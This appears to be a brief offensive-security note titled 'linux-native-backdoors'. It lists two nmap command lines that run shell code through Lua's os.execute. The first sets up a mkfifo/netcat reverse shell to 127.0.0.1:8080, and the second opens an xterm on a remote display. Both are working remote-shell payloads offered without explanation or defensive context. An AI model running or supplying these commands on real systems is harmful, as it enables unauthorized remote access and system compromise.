linux-native-backdoors
======================

nmap cmd line execution:
nmap --script <(echo "os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f')")
nmap --script <(echo "os.execute('xterm -display 127.0.0.1:1')")

